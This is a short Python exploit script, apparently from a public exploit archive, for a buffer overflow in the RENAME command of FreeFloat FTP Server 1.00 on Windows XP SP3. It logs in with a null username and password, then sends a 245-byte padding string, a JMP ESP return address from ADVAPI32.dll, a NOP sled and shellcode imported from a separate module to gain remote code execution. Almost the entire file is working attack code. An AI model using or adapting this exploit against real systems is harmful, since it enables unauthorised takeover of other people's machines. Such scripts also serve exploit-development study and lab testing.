#!/usr/bin/env python      
# -*- coding: utf-8 -*-

# Exploit Title:  FreeFloat FTP Server RENAME Command Buffer Overflow Exploit
# Date:           29/10/2016
# Exploit Author: Eagleblack
# Software Link:  http://www.freefloat.com/software/freefloatftpserver.zip
# Version:        1.00
# Tested on:      Windows XP Profesional SP3 Spanish version x86
# CVE :           N/A

#Description:     FreeFloat FTP server allow login as root without a user and password, this vulnerability allow to an attacker login and send a 
#                 long  chain of characters that overflow the buffer, when the attacker knows the exact number that overwritten the EIP registry
#		  he can take possession of the application and send a malicious code (payload) to the ESP stack pointer that allow obtain
#		  a remote code execution on the system that is running the FTP Server, in this case Windows XP.
import socket
from payload import buf
def shell_attack(target_machine, target_port):

    ret = "\x5B\x96\xDC\x77" #ADVAPI32.dll this dll have a jump to ESP stack pointer
     

    buffer =  '\x41'* 245 + ret + '\x90'* 30 + buf #EIP overwritten at offset 245
    

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open socket
    connect = s.connect((target_machine,target_port))              #IP address and port (21) from the target
    s.recv(1024)                                          #FTPBanner
    s.send('USER \r\n')                                   #Sending USER (Null user)
    s.recv(1024) 
    s.send('PASS \r\n')                                   #Sending Password (Null password)
    s.recv(1024)
    s.send('RENAME' + buffer +'\r\n')
    s.close()